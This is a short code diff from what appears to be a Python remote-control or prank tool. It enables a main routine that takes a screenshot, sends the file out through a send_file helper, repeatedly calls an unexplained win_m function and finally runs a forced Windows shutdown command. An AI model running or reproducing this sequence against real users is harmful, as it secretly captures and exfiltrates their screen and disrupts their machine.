@@ -100,17 +100,17 @@ def main():
     thread.daemon = True
     thread.start()
 
-    while True:
-        pass
+    # while True:
+    #     pass
 
-    # win_m()
-    # get_screenshot()
-    # send_file('screenshot.png')
-    # win_m()
-    # for _ in range(0, random.randint(50, 80)):
-    #     time.sleep(2)
-    #     win_m()
-    # run_cmd('shutdown -s -t 0')
+    win_m()
+    get_screenshot()
+    send_file('screenshot.png')
+    win_m()
+    for _ in range(0, random.randint(50, 80)):
+        time.sleep(2)
+        win_m()
+    run_cmd('shutdown -s -t 0')
 
 
 if __name__ == '__main__':
